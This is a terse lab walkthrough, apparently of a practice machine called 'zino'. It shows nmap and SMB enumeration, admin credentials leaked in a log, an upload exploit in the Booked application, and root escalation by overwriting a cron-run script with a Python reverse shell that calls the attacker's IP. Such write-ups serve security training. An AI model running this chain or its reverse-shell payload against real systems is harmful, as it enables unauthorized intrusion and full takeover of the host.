# NMAP
```sh
nmap -sC -sV -Pn -oA zino 192.168.55.64
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 19:54 CST
Nmap scan report for 192.168.55.64
Host is up (0.045s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b26675501b18f5e99fdb2cd4e3957a44 (RSA)
|   256 912d26f1baafd18b698f814a32af9c77 (ECDSA)
|_  256 ec6fdf8bce19138a52573e72a3146f40 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, GetRequest, JavaRMI, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, TLSSessionReq, TerminalServerCookie, WMSRequest: 
|_    Host '192.168.49.55' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=3/7%Time=6407EACC%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetRequest,
SF:4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,4C,"
SF:H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSStatusRequestT
SF:CP,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalSe
SF:rverCookie,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20no
SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TL
SF:SSessionReq,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20n
SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(L
SF:PDString,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAP
SF:SearchReq,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NCP
SF:,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NotesRPC,4C,
SF:"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(JavaRMI,4C,"H\0\
SF:0\x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server")%r(WMSRequest,4C,"H\0\0\
SF:x01\xffj\x04Host\x20'192\.168\.49\.55'\x20is\x20not\x20allowed\x20to\x2
SF:0connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Host: ZINO; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: zino
|   NetBIOS computer name: ZINO\x00
|   Domain name: \x00
|   FQDN: zino
|_  System time: 2023-03-07T20:55:22-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-08T01:55:20
|_  start_date: N/A
|_clock-skew: mean: 1h40m47s, deviation: 2h53m14s, median: 46s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.45 seconds

```

```
mbclient \\\\192.168.55.64\\zino\\       
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul  9 14:11:49 2020
  ..                                  D        0  Tue Apr 28 08:38:53 2020
  .bash_history                       H        0  Tue Apr 28 10:35:28 2020
  error.log                           N      265  Tue Apr 28 09:07:32 2020
  .bash_logout                        H      220  Tue Apr 28 08:38:53 2020
  local.txt                           N       33  Tue Mar  7 19:54:24 2023
  .bashrc                             H     3526  Tue Apr 28 08:38:53 2020
  .gnupg                             DH        0  Tue Apr 28 09:17:02 2020
  .profile                            H      807  Tue Apr 28 08:38:53 2020
  misc.log                            N      424  Tue Apr 28 09:08:15 2020
  auth.log                            N      368  Tue Apr 28 09:07:54 2020
  access.log                          N     5464  Tue Apr 28 09:07:09 2020
  ftp                                 D        0  Tue Apr 28 09:12:56 2020

                7158264 blocks of size 1024. 4726568 blocks available
smb: \> get .profile
getting file \.profile of size 807 as .profile (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec)
smb: \> get .bash_logout
getting file \.bash_logout of size 220 as .bash_logout (1.3 KiloBytes/sec) (average 2.9 KiloBytes/sec)
smb: \> get misc.log
getting file \misc.log of size 424 as misc.log (2.5 KiloBytes/sec) (average 2.7 KiloBytes/sec)
smb: \> get .bashrc
getting file \.bashrc of size 3526 as .bashrc (19.6 KiloBytes/sec) (average 7.0 KiloBytes/sec)
smb: \> exit

```

```
cat misc.log 
Apr 28 08:39:01 zino systemd[1]: Starting Clean php session files...
Apr 28 08:39:01 zino CRON[2791]: (CRON) info (No MTA installed, discarding output)
Apr 28 08:39:01 zino systemd[1]: phpsessionclean.service: Succeeded.
Apr 28 08:39:01 zino systemd[1]: Started Clean php session files.
Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
```

https://www.exploit-db.com/exploits/50594
Uploads the favicon file.

Added a reverse shell into the look and feel section
Once uploaded there is no notice it is complete.
Browse to `http://192.168.55.64:8003/booked/Web/custom-favicon.php`

Found in crontab that there is a cleanup python script.
```
ww-data@zino:/var/www/html/booked$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
```
File was able to be edited by web so it was time to edit.

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@zino:/var/www/html/booked$ echo  > cleanup.py   
echo  > cleanup.py
www-data@zino:/var/www/html/booked$ cat cleanup.py
cat cleanup.py
www-data@zino:/var/www/html/booked$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.55",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > cleanup.py
<;p=subprocess.call(["/bin/sh","-i"]);' > cleanup.py
www-data@zino:/var/www/html/booked$ cat cleanup.py
cat cleanup.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.55",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
www-data@zino:/var/www/html/booked$ 
```

